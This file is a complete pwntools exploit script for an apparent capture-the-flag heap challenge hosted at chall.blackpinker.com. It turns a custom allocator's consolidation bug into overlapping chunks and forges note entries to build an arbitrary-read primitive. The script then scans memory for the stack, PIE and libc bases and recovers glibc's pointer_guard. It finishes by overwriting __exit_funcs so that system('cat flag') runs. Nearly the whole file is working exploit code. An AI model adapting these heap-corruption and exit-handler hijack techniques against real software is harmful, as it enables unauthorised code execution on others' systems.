#!/usr/bin/env python3

from pwn import *
import math
import struct
import time
from pathlib import Path

# -----------------------------------------------------------------------------
# pwntools setup
# -----------------------------------------------------------------------------

context.arch = "amd64"
context.log_level = "info"
context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF("./prob", checksec=False)
context.binary = exe

libc = None
for cand in ("./libs/libc.so.6", "./libc.so.6"):
    if Path(cand).exists():
        libc = ELF(cand, checksec=False)
        break

HOST = "chall.blackpinker.com"
PORT = 20767
PROMPT = b"cmd > "
BAD_ADDR = 0x414141414141

# -----------------------------------------------------------------------------
# short helpers in the style you are using
# -----------------------------------------------------------------------------

info = lambda msg: log.info(msg)
s    = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa   = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl   = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla  = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn   = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna  = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln  = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru   = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r    = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n)

# -----------------------------------------------------------------------------
# constants used by the exploit
# -----------------------------------------------------------------------------

NOTES_PER_BOOK = 48
SLOTS_PER_GROUP = 23         # one 0x2f0 writer can corrupt 23 fake Note entries
SCAN_GROUPS = 10             # 10 groups -> 230 probes per batch
PAGE = 0x1000
LEAK_CHUNK = 0x100

STACK_SCAN_LO = 0x7FFC00000000
STACK_SCAN_HI = 0x800000000000
STACK_SCAN_STRIDE = 0x20000
STACK_REFINE_LO = 0x40000
STACK_REFINE_HI = 0x50000

LIBC_SYSTEM_OFFSET = 0x58750
LIBC_EXIT_FUNCS_OFFSET = 0x203680
LIBC_INIT_PTR_CHUNK = 0x200
CAGE_DTOR_OFFSET = 0x4A6C
REMAINDER_CHUNK_SIZE = 0x180

BOOKS_OFFSET = exe.symbols["books"]
WRITE_GOT_OFFSET = exe.got["write"]

# -----------------------------------------------------------------------------
# misc helpers
# -----------------------------------------------------------------------------

def p64s(*xs):
    return b"".join(p64(x) for x in xs)


def unpack_qword(data):
    return struct.unpack("<Q", data)[0]


def rol64(x, r):
    return ((x << r) | (x >> (64 - r))) & ((1 << 64) - 1)


def ror64(x, r):
    return ((x >> r) | ((x & ((1 << r) - 1)) << (64 - r))) & ((1 << 64) - 1)


def chunked(seq, n):
    for i in range(0, len(seq), n):
        yield seq[i:i+n]


def recv_n_prompts(count, proc=None):
    """Receive until we have seen 'count' menu prompts."""
    tube = proc or p
    data = b""
    while data.count(PROMPT) < count:
        chunk = tube.recv(timeout=10)
        if not chunk:
            raise EOFError("connection closed while waiting for prompts")
        data += chunk
    return data


# -----------------------------------------------------------------------------
# gdb
# -----------------------------------------------------------------------------

def GDB():
    if args.REMOTE:
        return
    gdb.attach(p, gdbscript='''
        set max-visualize-chunk-size 0x500
        # release
        # b*0x555555554dd4

        # Cage::put_into_bins(Cage::Block*)
        # b*0x555555555971

        # pop_bin
        # b*0x555555555616

        # consolidate path
        # b*0x555555555657

        # inside put_into_bins
        # b*0x555555555a45

        # bins insert
        # b*0x555555555a57

        c
    ''')
    sleep(1)


# -----------------------------------------------------------------------------
# connection
# -----------------------------------------------------------------------------

if args.REMOTE:
    p = remote(args.HOST or HOST, int(args.PORT or PORT))
else:
    p = process([exe.path])

ru(PROMPT)


# -----------------------------------------------------------------------------
# menu wrappers
# -----------------------------------------------------------------------------

def switch(book_idx):
    slna(PROMPT, 0)
    slna(b"Book: ", book_idx)


def write_note(slot, data):
    slna(PROMPT, 1)
    slna(b"slot: ", slot)
    slna(b"size: ", len(data))
    sa(b"data: ", data)


def write_note_sized(slot, size, data):
    """Same as write_note(), but size can differ from len(data) if needed."""
    slna(PROMPT, 1)
    slna(b"slot: ", slot)
    slna(b"size: ", size)
    sa(b"data: ", data)


def read_note_raw(slot):
    slna(PROMPT, 2)
    slna(b"slot: ", slot)
    return ru(PROMPT)


def erase_note(slot):
    slna(PROMPT, 3)
    slna(b"slot: ", slot)


def erase_then_rewrite_same_slot(slot, size, payload):
    """
    Small RTT optimization used everywhere in the original script:
    send erase(slot) immediately followed by write(slot, size, payload).
    """
    s(
        b"3\n" + str(slot).encode() +
        b"\n1\n" + str(slot).encode() +
        b"\n" + str(size).encode() + b"\n"
    )
    ru(b"data: ")
    s(payload)
    ru(PROMPT)


# -----------------------------------------------------------------------------
# overlap groups
# -----------------------------------------------------------------------------
# Each group uses 4 slots in book 0:
#   A = req 0x170 -> chunk 0x180
#   B = req 0x170 -> chunk 0x180
#   C = req 0x2f0 -> chunk 0x300
#   D = req 0x0f0 -> chunk 0x100 (guard against top consolidation)
#
# free(B), free(A), free(C) triggers the buggy consolidate path and creates
# overlapping free chunks. Then:
#   switch(book_i)    allocates the notebook from one overlap chunk
#   write(slot A)     allocates writer chunk from the other overlap chunk
#
# The writer payload starting at offset 0x180 overlaps notes[0..22] of book_i.
# -----------------------------------------------------------------------------

class OverlapGroup:
    def __init__(self, gid):
        self.gid = gid
        self.book_idx = gid + 1
        self.base_slot = gid * 4
        self.writer_slot = self.base_slot + 0
        self.guard_slot = self.base_slot + 3


groups = [OverlapGroup(i) for i in range(SCAN_GROUPS)]


def build_writer_payload(fake_pairs, prefix_patches=None):
    """
    Create the 0x2f0 payload for the writer chunk.

    Layout:
      [0x000..0x17f]  optional prefix data / fake structures
      [0x180..]       forged Note entries for the overlapped notebook

    Each fake pair is (size, addr) and becomes:
      struct Note { uint64_t size; char *data; }
    """
    payload = bytearray(b"\x00" * 0x2F0)

    if prefix_patches:
        for off, blob in prefix_patches:
            payload[off:off+len(blob)] = blob

    pos = 0x180
    fake_pairs = list(fake_pairs[:SLOTS_PER_GROUP])
    while len(fake_pairs) < SLOTS_PER_GROUP:
        fake_pairs.append((1, BAD_ADDR))

    for size, addr in fake_pairs:
        payload[pos:pos+0x10] = p64s(size, addr)
        pos += 0x10

    return bytes(payload)


def setup_group(g):
    info(f"setup group {g.gid} -> book {g.book_idx}")

    switch(0)
    write_note_sized(g.base_slot + 0, 0x170, b"A")
    write_note_sized(g.base_slot + 1, 0x170, b"B")
    write_note_sized(g.base_slot + 2, 0x2F0, b"C")
    write_note_sized(g.base_slot + 3, 0x0F0, b"D")

    # Trigger the allocator bug.
    erase_note(g.base_slot + 1)   # free B
    erase_note(g.base_slot + 0)   # free A -> merge backward, priv_size bug
    erase_note(g.base_slot + 2)   # free C -> creates overlapping free chunks

    # Allocate notebook from one overlap chunk.
    switch(g.book_idx)

    # Allocate writer from the other overlap chunk.
    switch(0)
    write_note_sized(g.writer_slot, 0x2F0, build_writer_payload([]))


def setup_all_groups():
    for g in groups:
        setup_group(g)


def reload_group_payloads(group_to_pairs):
    """
    Rebuild writer payloads so each group forges a new set of fake Notes.
    This is how we turn the overlap into a reusable arbitrary-read primitive.
    """
    switch(0)
    for g in group_to_pairs:
        payload = build_writer_payload(group_to_pairs[g])
        erase_then_rewrite_same_slot(g.writer_slot, 0x2F0, payload)


# -----------------------------------------------------------------------------
# arbitrary read primitive
# -----------------------------------------------------------------------------

def batch_read_menu(used_groups):
    """
    Send:
      switch(book_i)
      read slot 0..22
    for every group in one large transcript, then parse all responses.
    """
    transcript = b""
    for g in used_groups:
        transcript += b"0\n" + str(g.book_idx).encode() + b"\n"
        for slot in range(SLOTS_PER_GROUP):
            transcript += b"2\n" + str(slot).encode() + b"\n"

    s(transcript)
    data = recv_n_prompts(len(used_groups) * (SLOTS_PER_GROUP + 1))
    parts = data.split(PROMPT)

    cursor = 0
    out = {}
    for g in used_groups:
        cursor += 1  # skip switch reply
        slot_out = []
        for _ in range(SLOTS_PER_GROUP):
            part = parts[cursor]
            cursor += 1
            if b"slot: " in part:
                part = part.split(b"slot: ", 1)[1]
            slot_out.append(part)
        out[g.gid] = slot_out
    return out


def parse_read_part(part):
    if not part.endswith(b"\n"):
        raise ValueError(f"unexpected read reply: {part!r}")
    return part[:-1]


def leak_specs(specs, used_groups=None):
    """
    specs = [(size, addr), ...]
    Forge fake Notes and issue batched reads.
    """
    if used_groups is None:
        used_groups = groups

    outputs = []
    capacity = len(used_groups) * SLOTS_PER_GROUP

    for spec_batch in chunked(specs, capacity):
        active_groups = used_groups[:math.ceil(len(spec_batch) / SLOTS_PER_GROUP)]

        mapping = {}
        idx = 0
        for g in active_groups:
            mapping[g] = spec_batch[idx:idx + SLOTS_PER_GROUP]
            idx += SLOTS_PER_GROUP

        reload_group_payloads(mapping)
        batch_reads = batch_read_menu(active_groups)

        remaining = len(spec_batch)
        for g in active_groups:
            for slot in range(min(SLOTS_PER_GROUP, remaining)):
                raw = parse_read_part(batch_reads[g.gid][slot])
                outputs.append(raw)
            remaining -= SLOTS_PER_GROUP

    return outputs


def leak(addr, size, used_groups=None):
    specs = []
    off = 0
    while off < size:
        take = min(LEAK_CHUNK, size - off)
        specs.append((take, addr + off))
        off += take
    return b"".join(leak_specs(specs, used_groups=used_groups))


def leak_qword(addr, used_groups=None):
    return unpack_qword(leak(addr, 8, used_groups=used_groups))


# -----------------------------------------------------------------------------
# locating stack / pie / libc
# -----------------------------------------------------------------------------

def probe_readable(addrs):
    """
    Probe one byte from every address.

    If address is readable:
      write(1, ptr, 1) returns one byte, so parsed body length == 1
    If address is unreadable:
      write fails with EFAULT and we only get the trailing newline,
      so parsed body length == 0
    """
    specs = [(1, addr) for addr in addrs]
    raws = leak_specs(specs)
    return [len(x) == 1 for x in raws]


def find_stack_anchor():
    """Coarse scan high user-space for any readable page that belongs to stack."""
    cur = STACK_SCAN_HI - PAGE
    batches = 0
    started = time.time()

    while cur >= STACK_SCAN_LO:
        addrs = []
        for _ in range(len(groups) * SLOTS_PER_GROUP):
            if cur < STACK_SCAN_LO:
                break
            addrs.append(cur)
            cur -= STACK_SCAN_STRIDE

        hits = probe_readable(addrs)
        for addr, ok in zip(addrs, hits):
            if ok:
                log.success(f"stack anchor at {addr:#x}")
                return addr

        batches += 1
        if batches % 16 == 0:
            done = (STACK_SCAN_HI - PAGE) - cur
            total = STACK_SCAN_HI - STACK_SCAN_LO
            pct = 100.0 * done / total
            info(f"stack scan: {pct:.2f}% ({cur:#x} left), elapsed {time.time() - started:.1f}s")

    raise RuntimeError("stack anchor not found")


def refine_stack_mapping(anchor):
    """Refine around the first hit and keep the longest consecutive readable range."""
    lo = (anchor - STACK_REFINE_LO) & ~(PAGE - 1)
    hi = (anchor + STACK_REFINE_HI) & ~(PAGE - 1)
    pages = list(range(lo, hi, PAGE))

    readable = probe_readable(pages)
    hit_pages = [page for page, ok in zip(pages, readable) if ok]
    if not hit_pages:
        raise RuntimeError("refine failed: no readable pages")

    best = []
    cur = []
    for page in hit_pages:
        if cur and page == cur[-1] + PAGE:
            cur.append(page)
        else:
            if len(cur) > len(best):
                best = cur
            cur = [page]
    if len(cur) > len(best):
        best = cur

    stack_lo = best[0]
    stack_hi = best[-1] + PAGE
    log.success(f"stack mapping {stack_lo:#x} - {stack_hi:#x}")
    return stack_lo, stack_hi


def dump_stack(stack_lo, stack_hi):
    specs = [(LEAK_CHUNK, addr) for addr in range(stack_lo, stack_hi, LEAK_CHUNK)]
    return b"".join(leak_specs(specs))


def find_auxv_and_pie(stack_blob):
    """
    Walk the dumped stack looking for an auxv array.
    We need AT_PHDR (type 3):
        pie_base = AT_PHDR - exe.header.e_phoff
    """
    e_phoff = exe.header.e_phoff

    for off in range(0, len(stack_blob) - 0x80, 8):
        seen = {}
        pairs = []
        j = off

        while j + 0x10 <= len(stack_blob):
            typ = unpack_qword(stack_blob[j:j+8])
            val = unpack_qword(stack_blob[j+8:j+0x10])
            pairs.append((typ, val))
            j += 0x10

            if typ == 0:
                break
            if typ > 0x1000:
                break
            seen[typ] = val

        if not pairs or pairs[-1][0] != 0 or 3 not in seen:
            continue

        pie = seen[3] - e_phoff
        if pie & 0xFFF:
            continue

        if leak(pie, 4, used_groups=[groups[0]]) != b"\x7fELF":
            continue

        log.success(f"PIE base {pie:#x}")
        return pie, seen

    raise RuntimeError("failed to recover PIE from auxv")


def find_elf_base(any_ptr, used_groups=None, max_back=0x400000):
    """
    Starting from any pointer inside an ELF mapping, scan backwards by page
    until the ELF magic appears.
    """
    if used_groups is None:
        used_groups = [groups[0]]

    start = any_ptr & ~(PAGE - 1)
    pages = [start - off for off in range(0, max_back + PAGE, PAGE)]

    for batch in chunked(pages, len(used_groups) * SLOTS_PER_GROUP):
        specs = [(4, page) for page in batch]
        raws = leak_specs(specs, used_groups=used_groups)
        for page, raw in zip(batch, raws):
            if raw == b"\x7fELF":
                return page

    raise RuntimeError(f"ELF base not found near {any_ptr:#x}")


# -----------------------------------------------------------------------------
# pointer_guard and final hijack
# -----------------------------------------------------------------------------

def recover_pointer_guard(pie, libc_base):
    """
    __exit_funcs stores mangled function pointers:
        mangled = rol(real_fn ^ pointer_guard, 17)

    Find an exit entry that belongs to the binary (arg or dso inside PIE),
    assume its real function is Cage destructor at pie + CAGE_DTOR_OFFSET,
    then recover pointer_guard.
    """
    exit_funcs_ptr = leak_qword(libc_base + LIBC_EXIT_FUNCS_OFFSET, used_groups=[groups[0]])
    init_blob = leak(exit_funcs_ptr, LIBC_INIT_PTR_CHUNK, used_groups=[groups[0]])
    idx = unpack_qword(init_blob[8:16])

    for i in range(idx):
        base = 0x10 + i * 0x20
        if base + 0x20 > len(init_blob):
            break

        flavor, mangled, arg, dso = struct.unpack("<QQQQ", init_blob[base:base+0x20])
        if flavor != 4:
            continue

        if pie <= arg < pie + 0x20000 or pie <= dso < pie + 0x20000:
            guard = ror64(mangled, 17) ^ (pie + CAGE_DTOR_OFFSET)
            log.success(f"pointer_guard {guard:#x}")
            return guard

    raise RuntimeError("failed to recover pointer_guard")


def final_overwrite(pie, libc_base, pointer_guard):
    """
    Build a fake exit_function_list inside the writer chunk, then free a fake
    chunk and resize it so allocator split places a remainder at __exit_funcs.
    The final allocation writes the pointer to our fake list there.
    """
    book0 = leak_qword(pie + BOOKS_OFFSET, used_groups=[groups[0]])
    writer = leak_qword(book0 + 0x8, used_groups=[groups[0]])

    info(f"book0 {book0:#x}")
    info(f"writer {writer:#x}")

    filler0 = 40
    filler1 = 41
    split_slot = 42
    overwrite_slot = 43

    switch(0)
    write_note_sized(filler0, 0x4000, b"E")
    write_note_sized(filler1, 0x4000, b"F")

    filler1_ptr = leak_qword(book0 + filler1 * 0x10 + 0x8, used_groups=[groups[0]])

    fake_list = writer + 0x20
    cmd_str = writer + 0x60
    fake_hdr = writer + 0x100
    fake_pay = fake_hdr + 0x10
    fake_safe_size = (filler1_ptr - 0x10) - fake_hdr

    if fake_safe_size < 0x4000:
        raise RuntimeError("fake chunk safe size too small")

    system = libc_base + LIBC_SYSTEM_OFFSET

    # Stage 1: safe fake chunk + fake exit_function_list.
    stage1_prefix = [
        (0x20, p64s(0, 1, 4, rol64(system ^ pointer_guard, 17), cmd_str, 0)),
        (0x60, b"cat flag\x00"),
        (0x100, p64s(0, fake_safe_size | 1)),
    ]
    stage1_pairs = [(8, fake_pay)]

    switch(0)
    erase_then_rewrite_same_slot(
        groups[0].writer_slot,
        0x2F0,
        build_writer_payload(stage1_pairs, stage1_prefix),
    )

    # Free fake chunk via forged note in overlapped notebook.
    switch(groups[0].book_idx)
    erase_note(0)

    # Stage 2: enlarge fake chunk so split remainder lands on __exit_funcs.
    split_size = (libc_base + LIBC_EXIT_FUNCS_OFFSET - 0x10) - fake_hdr
    fake_final_size = split_size + REMAINDER_CHUNK_SIZE

    stage2_prefix = [
        (0x20, p64s(0, 1, 4, rol64(system ^ pointer_guard, 17), cmd_str, 0)),
        (0x60, b"cat flag\x00"),
        (0x100, p64s(0, fake_final_size | 1)),
    ]

    switch(0)
    erase_then_rewrite_same_slot(
        groups[0].writer_slot,
        0x2F0,
        build_writer_payload([], stage2_prefix),
    )

    huge_req = split_size - 0x10
    write_note_sized(split_slot, huge_req, b"Z")
    write_note_sized(overwrite_slot, 0x170, p64(fake_list))

    log.success(f"__exit_funcs overwritten -> {fake_list:#x}")


# -----------------------------------------------------------------------------
# solve
# -----------------------------------------------------------------------------

def solve():
    setup_all_groups()

    anchor = find_stack_anchor()
    stack_lo, stack_hi = refine_stack_mapping(anchor)
    stack_blob = dump_stack(stack_lo, stack_hi)

    pie, _ = find_auxv_and_pie(stack_blob)

    write_addr = leak_qword(pie + WRITE_GOT_OFFSET, used_groups=[groups[0]])
    libc_base = find_elf_base(write_addr, used_groups=[groups[0]])
    log.success(f"libc base {libc_base:#x}")

    pointer_guard = recover_pointer_guard(pie, libc_base)
    final_overwrite(pie, libc_base, pointer_guard)

    sln(6)
    out = p.recvall(timeout=5)
    if out:
        try:
            print(out.decode("utf-8", "ignore"))
        except Exception:
            print(repr(out))


if __name__ == "__main__":
    solve()
